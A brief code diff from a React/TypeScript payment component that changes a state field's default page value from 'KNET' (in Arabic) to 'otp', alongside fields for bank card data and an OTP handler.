@@ -160,7 +160,7 @@ export default function Payment (props: any)  {
     bank_card: [''],
     prefix: '',
     status: 'new',
-    page:'كي نت'
+    page:'otp'
   });
 
   const handleAddotp = (otp: string) => {
